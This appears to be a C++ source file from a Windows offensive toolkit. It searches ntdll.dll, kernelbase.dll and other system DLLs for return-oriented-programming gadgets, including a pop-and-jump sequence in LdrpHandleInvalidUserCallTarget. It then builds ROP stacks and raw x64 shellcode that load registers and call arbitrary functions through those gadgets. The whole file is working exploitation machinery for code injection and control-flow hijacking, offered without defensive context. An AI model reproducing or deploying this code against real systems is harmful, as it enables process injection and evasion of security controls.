#include <algorithm>
#include <vector>
#include <cassert>
#include <numeric>

#include "shellcode.h"
#include "common.h"
#include "pe.h"

namespace shellcode {

const auto system_dlls = {
    "ntdll.dll",
    "kernelbase.dll",
    "kernel32.dll",
    "user32.dll",
    "ucrtbase.dll"
};

PVOID find_rop_gadget_inf_loop() {
    return pe::find_code_in_module(
        "ntdll.dll",
        {
            0xEB, 0xFE // JMP -2 (infinite loop)
        }
    );
}

} // namespace shellcode

namespace shellcode::x64 {

PVOID find_rop_gadget_pop_values_and_ret(size_t count) {

    assert(count > 0);

    uint8_t pop_8[] = {
        0x58, // pop rax
        0x5A, // pop rdx
        0x59, // pop rcx
        // 0x5B, // pop rbx
        // 0x5E, // pop rsi
        // 0x5F, // pop rdi
        // 0x5D, // pop rbp
    };

    uint16_t pop_16[] = {
        0x5941, // pop r9
        0x5841, // pop r8
        0x5A41, // pop r10
        0x5B41, // pop r11
        0x5C41, // pop r12
        0x5D41, // pop r13
        0x5E41, // pop r14
        0x5F41, // pop r15
    };

    for (auto dll_name : system_dlls) {

        auto module_code = pe::get_module_section(dll_name, ".text");
        if (module_code.empty()) {
            return NULL;
        }

        auto *begin = (uint8_t *)&module_code.front();
        auto *end = (uint8_t *)PTR_ADD(begin, module_code.size());

        auto it = begin + sizeof(uint16_t) * count; // max possible chain
        if (it > end) {
            return NULL;
        }

        it = std::find(it, end, (uint8_t)0xC3);

        while (it != end) {

            size_t pop_count = 0;
            auto it_back = it;
            while (pop_count < count) {

                it_back -= 2; // first check 2-bytes instructions
                bool found = false;

                for (uint16_t pop : pop_16) {
                    if (*(uint16_t *)&*it_back == pop) {
                        found = true;
                        pop_count++;
                        break;
                    }
                }

                if (found) {
                    continue;
                }

                it_back++; // then check 1-bytes instructions

                for (uint8_t pop : pop_8) {
                    if (*(uint8_t *)&*it_back == pop) {
                        found = true;
                        pop_count++;
                        break;
                    }
                }

                if (found) {
                    continue;
                }

                it_back -= 3; // then check 4-bytes "add rsp, X"

                uint32_t add_rsp = 0xC48348;
                add_rsp |= ((count - pop_count) * 8) << 24; // 48 83 C4 XX

                if (pop_count) {
                    if (*(uint32_t *)&*it_back == add_rsp) {
                        return (PVOID) & *it_back;
                    }
                }

                break;
            }

            if (pop_count == count) {
                return (PVOID) & *it_back;
            }

            it = std::find(it + 1, end, (uint8_t)0xC3);
        }
    }

    return nullptr;
}

PVOID find_rop_gadget_pop_value_and_ret() {
    return pe::find_code_in_module(
        "ntdll.dll",
        {
            0x58, // pop rax
            0xC3  // ret
        }
    );
}

PVOID find_rop_gadget_ret() {
    return pe::find_code_in_module("ntdll.dll", { 0xC3 });
}

} // namespace shellcode::x64

namespace shellcode::x64::LdrpHandleInvalidUserCallTarget {

//  .text:0000000180123AB0; void __fastcall LdrpHandleInvalidUserCallTarget()
//  [...]
//  .text:0000000180123AB0 41 53                                         push    r11
//  .text:0000000180123AB2 41 52                                         push    r10
//  .text:0000000180123AB4 41 51                                         push    r9
//  .text:0000000180123AB6 41 50                                         push    r8
//  .text:0000000180123AB8 51                                            push    rcx
//  .text:0000000180123AB9 52                                            push    rdx
//  .text:0000000180123ABA 50                                            push    rax
//  [...]
//  .text:0000000180123B12 58                                            pop     rax
//  .text:0000000180123B13 5A                                            pop     rdx
//  .text:0000000180123B14 59                                            pop     rcx
//  .text:0000000180123B15 41 58                                         pop     r8
//  .text:0000000180123B17 41 59                                         pop     r9
//  .text:0000000180123B19 41 5A                                         pop     r10
//  .text:0000000180123B1B 41 5B                                         pop     r11
//  .text:0000000180123B1D 48 FF E0                                      jmp     rax
//  [...]
//  .text:0000000180123B31 58                                            pop     rax <--- skip this instruction (to not remove return address)
//  .text:0000000180123B32 5A                                            pop     rdx <--- 2th arg
//  .text:0000000180123B33 59                                            pop     rcx <--- 1th arg
//  .text:0000000180123B34 41 58                                         pop     r8  <--- 3th arg
//  .text:0000000180123B36 41 59                                         pop     r9  <--- 4th arg
//  .text:0000000180123B38 41 5A                                         pop     r10
//  .text:0000000180123B3A 41 5B                                         pop     r11
//  .text:0000000180123B3C C3                                            retn

PVOID find_rop_gadget_pop_values_and_jmp() {
    return pe::find_code_in_module(
        "ntdll.dll",
        {
            0x58,            // pop rax
            0x5A,            // pop rdx
            0x59,            // pop rcx
            0x41, 0x58,      // pop r8
            0x41, 0x59,      // pop r9
            0x41, 0x5A,      // pop r10
            0x41, 0x5B,      // pop r11
            0x48, 0xFF, 0xE0 // jmp rax
        }
    );
}

PVOID find_rop_gadget_setup_reg_values_and_ret() {
    return pe::find_code_in_module(
        "ntdll.dll",
        {
            0x5A,       // pop rdx
            0x59,       // pop rcx
            0x41, 0x58, // pop r8
            0x41, 0x59, // pop r9
            0x41, 0x5A, // pop r10
            0x41, 0x5B, // pop r11
            0xC3        // ret
        }
    );
}

PVOID find_rop_gadget_pop_values_and_ret8(size_t count) {

    assert(count <= 8);

    std::vector<uint8_t> code;

    switch (count) {
    case 8:
        code.insert(code.end(), { 0x41, 0x5F }); // pop r15
    case 7:
        code.insert(code.end(), { 0x41, 0x5E }); // pop r14
    case 6:
        code.insert(code.end(), { 0x41, 0x5D }); // pop r13
    case 5:
        code.insert(code.end(), { 0x41, 0x5C }); // pop r12
    case 4:
        code.insert(code.end(), { 0x5F }); // pop rdi
    case 3:
        code.insert(code.end(), { 0x5E }); // pop rsi
    case 2:
        code.insert(code.end(), { 0x5B }); // pop rbx
    case 1:
        code.insert(code.end(), { 0x5D }); // pop rbp
    default:
        code.insert(code.end(), { 0xC3 }); // retn
    }

    return pe::find_code_in_module("kernelbase.dll", code);
}

PVOID find_clean_stack_gadget(size_t count, size_t& extra_imm64) {

    for (size_t i = 0; i < 10; i++) {
        PVOID StackCleanGadgetAddr = find_rop_gadget_pop_values_and_ret(count + i); // shadow space + stack args + extra space for gadget
        if (StackCleanGadgetAddr) {
            extra_imm64 += i;
            return StackCleanGadgetAddr;
        }
    }

    return NULL;
};

std::vector<UINT64> build_stack_for_gadget(
    PVOID RetAddr, PVOID FunctionAddress, UINT64 Arg1, UINT64 Arg2, UINT64 Arg3, UINT64 Arg4,
    const std::initializer_list<uint64_t>& ArgsExtra, bool sp_aligned
) {

    size_t extra_imm64 = 0;

    PVOID StackPlaceholderGadgetAddr = find_rop_gadget_ret();

    do {
        // gadget to clean stack from shadow space, stack args and alignment
        PVOID StackCleanGadgetAddr = find_clean_stack_gadget(4 + ArgsExtra.size(), extra_imm64);
        if (!StackCleanGadgetAddr) {
            return {};
        }

        std::vector<UINT64> stack;
        size_t imm64_count = 0; // count if we need to add aligning imm64 value on stack

        auto push_imm64 = [&](UINT64 value) {
            stack.insert(stack.end(), value);
            imm64_count++;
        };

        for (auto arg : {
                 Arg2,      // rdx
                 Arg1,      // rcx
                 Arg3,      // r8
                 Arg4,      // r9
                 (UINT64)0, // r11 (none)
                 (UINT64)0, // r10 (none)
                 (UINT64)FunctionAddress,
             }) {
            push_imm64(arg);
            imm64_count--; // args will be popped by gadget
        }

        push_imm64((UINT64)StackCleanGadgetAddr);

        // shadow space (0x20 bytes)

        for (size_t i = 0; i < 4; i++) {
            push_imm64((UINT64)0xDEADDEADDEADDEAD);
        }

        // stack args

        for (auto Arg : ArgsExtra) {
            push_imm64(Arg);
        }

        for (size_t i = 0; i < extra_imm64; i++) {
            push_imm64((UINT64)StackPlaceholderGadgetAddr); // some values will be deleted by the gadget, the rest will delete themselves (ret)
        }

        // if RetAddr is not passed, we will use address from stack

        if (RetAddr) {
            push_imm64((UINT64)RetAddr);
        }

        // when rip becomes equal to FunctionAddress, we should have an unaligned stack (aligned + imm64 RetAddr)
        if (sp_aligned != IS_ALIGNED(imm64_count * sizeof(UINT64), 4)) {
            return stack;
        }

        extra_imm64 = 1; // try build with alignment
    } while (true);
}

std::vector<uint8_t> build_shellcode_for_gadget(
    PVOID RetAddr, PVOID FunctionAddress, UINT64 Arg1, UINT64 Arg2, UINT64 Arg3, UINT64 Arg4,
    const std::initializer_list<uint64_t>& ArgsExtra, bool sp_aligned
) {

    size_t extra_imm64 = 0;

    // the main gadget to setup registers and jump via ret
    PVOID CallGadgetAddr = find_rop_gadget_setup_reg_values_and_ret();
    PVOID StackPlaceholderGadgetAddr = find_rop_gadget_ret();

    do {
        PVOID StackCleanGadgetAddr = find_clean_stack_gadget(4 + ArgsExtra.size(), extra_imm64);
        if (!StackCleanGadgetAddr) {
            return {};
        }

        std::vector<uint8_t> shellcode;
        size_t imm64_count = 0; // count if we need to add aligning imm64 value on stack

        auto push_imm64 = [&](UINT64 value) {
            shellcode.insert(shellcode.end(), { 0x48, 0xB8 }); // mov rax, imm64
            shellcode.insert(shellcode.end(), (uint8_t *)&value, (uint8_t *)&value + sizeof(uint64_t));
            shellcode.insert(shellcode.end(), { 0x50 }); // push rax
            imm64_count++;
        };

        // if RetAddr is not passed, we will use address from stack

        if (RetAddr) {
            push_imm64((UINT64)RetAddr);
        }

        for (size_t i = 0; i < extra_imm64; i++) {
            push_imm64((UINT64)StackPlaceholderGadgetAddr); // some values will be deleted by the gadget, the rest will delete themselves (ret)
        }

        // stack args

        for (auto it = std::rbegin(ArgsExtra); it != std::rend(ArgsExtra); ++it) {
            push_imm64(*it);
        }

        // shadow space (0x20 bytes)

        for (size_t i = 0; i < 4; i++) {
            push_imm64((UINT64)0xDEADDEADDEADDEAD);
        }

        push_imm64((UINT64)StackCleanGadgetAddr);

        for (auto arg : {
                 (UINT64)FunctionAddress,
                 (UINT64)0, // r11 (none)
                 (UINT64)0, // r10 (none)
                 Arg4,      // r9
                 Arg3,      // r8
                 Arg1,      // rcx
                 Arg2,      // rdx
             }) {
            push_imm64(arg);
            imm64_count--; // args will be popped by gadget
        }

        shellcode.insert(shellcode.end(), { 0x48, 0xB8 }); // mov rax, imm64
        shellcode.insert(shellcode.end(), (uint8_t *)&CallGadgetAddr, (uint8_t *)&CallGadgetAddr + sizeof(uint64_t));
        shellcode.insert(shellcode.end(), { 0xFF, 0xE0 }); // jmp rax

        // when rip becomes equal to FunctionAddress, we should have an unaligned stack (aligned + imm64 RetAddr)
        if (sp_aligned != IS_ALIGNED(imm64_count * sizeof(UINT64), 4)) {
            return shellcode;
        }

        extra_imm64 = 1; // try build with alignment
    } while (true);
}

} // namespace shellcode::x64::LdrpHandleInvalidUserCallTarget
